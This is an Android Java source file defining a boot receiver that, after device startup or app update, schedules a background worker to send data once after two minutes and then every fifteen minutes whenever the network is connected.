package com.sabbir.dgw;

import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.io.File;
import java.util.concurrent.TimeUnit;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Received action: " + action);

        if (action != null && isValidBootAction(action)) {
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                scheduleWork(context);
            }, 5000);
        }
    }

    private boolean isValidBootAction(String action) {
        return action.equals(Intent.ACTION_BOOT_COMPLETED) ||
                action.equals(Intent.ACTION_MY_PACKAGE_REPLACED) ||
                action.equals("android.intent.action.QUICKBOOT_POWERON") ||
                action.equals(Intent.ACTION_REBOOT);
    }

    private void scheduleWork(Context context) {
        try {
            Constraints constraints = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build();

            OneTimeWorkRequest initWork = new OneTimeWorkRequest.Builder(DataSendWorker.class)
                    .setConstraints(constraints)
                    .setInitialDelay(2, TimeUnit.MINUTES)
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.MINUTES)
                    .addTag("init_work")
                    .build();

            PeriodicWorkRequest periodicWork = new PeriodicWorkRequest.Builder(
                    DataSendWorker.class,
                    15, TimeUnit.MINUTES)
                    .setConstraints(constraints)
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.MINUTES)
                    .addTag("periodic_data_sender")
                    .build();

            WorkManager workManager = WorkManager.getInstance(context);

            workManager.enqueueUniqueWork(
                    "init_data_sender",
                    ExistingWorkPolicy.REPLACE,
                    initWork
            );

            workManager.enqueueUniquePeriodicWork(
                    "DataSenderWork",
                    ExistingPeriodicWorkPolicy.UPDATE,
                    periodicWork
            );
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling work", e);
        }
    }
}